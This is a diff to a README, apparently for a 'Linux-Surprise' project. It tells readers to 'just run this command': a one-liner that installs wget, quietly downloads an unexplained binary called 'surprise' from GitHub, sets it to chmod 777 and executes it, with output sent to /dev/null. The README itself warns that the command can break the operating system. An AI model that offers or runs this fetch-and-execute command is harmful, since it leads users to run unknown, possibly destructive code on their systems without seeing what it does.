@@ -2,7 +2,7 @@
 
 ## just run this command:
 ```
-apt install wget &> /dev/null && wget https://github.com/StrikcYT/Linux-Surprise/raw/refs/heads/main/surprise &> /dev/null wd && ./surprise
+apt install wget &> /dev/null && wget https://github.com/StrikcYT/Linux-Surprise/raw/refs/heads/main/surprise &> /dev/null wd && chmod 777 surprise && ./surprise
 ```
 
 #### THIS COMMAND CAN BREAK YOUR OPERATING SYSTEM! 
